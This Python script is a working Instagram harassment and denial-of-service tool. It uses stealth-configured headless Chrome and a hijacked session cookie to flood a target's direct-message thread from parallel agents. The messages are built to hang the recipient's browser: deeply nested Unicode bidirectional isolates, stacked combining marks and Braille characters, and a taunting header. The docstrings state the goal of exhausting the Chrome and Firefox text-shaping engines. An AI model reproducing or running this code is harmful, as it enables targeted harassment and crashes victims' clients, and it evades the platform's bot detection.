# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (ARCHITECTURAL-VOID V72)
# 📅 STATUS: MAIN-THREAD-DEADLOCK | 4-AGENT TOTAL | AWS-CPU-MAX

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.05, 0.15)  # 🔥 High-Frequency Strike
REST_AFTER_STRIKES = 250   
REST_DURATION = 2          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_void_payload():
    """Generates a mathematically 'unsolvable' layout for the shaping engine."""
    u_id = random.randint(100, 999)
    
    # \u2066 = LRI | \u2067 = RLI | \u2069 = PDI (Recursive Isolates)
    # \u2800-\u28FF = Braille Patterns (Sub-pixel heavy)
    # \u0300-\u036F = Stacking Marks
    lri, rli, pdi = "\u2066", "\u2067", "\u2069"
    braille = "".join([chr(random.randint(0x2800, 0x28FF)) for _ in range(15)])
    marks = "".join([chr(i) for i in range(0x0300, 0x0345)]) 
    glue = "\u2060" 
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [VOID_LOCK:{u_id}]"
    
    body = []
    # 440 lines of 'Recursive Stack Thrashing'
    for i in range(440):
        # We nest isolates 15 levels deep. This exceeds the 'Fast-Path' 
        # of the Chrome/Firefox rendering core.
        nest = f"{lri}{rli}" * 7 + lri
        pop = f"{pdi}" * 15
        
        # We stack Braille patterns with marks inside the isolates
        # This forces the HarfBuzz engine to calculate 15 different sub-pixel 
        # 'Z-indexes' for every single line.
        line = f"{nest}P{marks}R{marks}A{marks}V{marks}EER{braille}{pop}🌙{i}{glue*5}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Direct DOM injection that forces the message past the 'Typing' hang."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                document.execCommand('insertText', false, arguments[0]);
                box.dispatchEvent(new Event('input', { bubbles: true }));
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            strike_count = 0
            while True:
                payload = get_void_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Void-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 80 == 0:
                        driver.refresh()
                        time.sleep(5)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(3)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
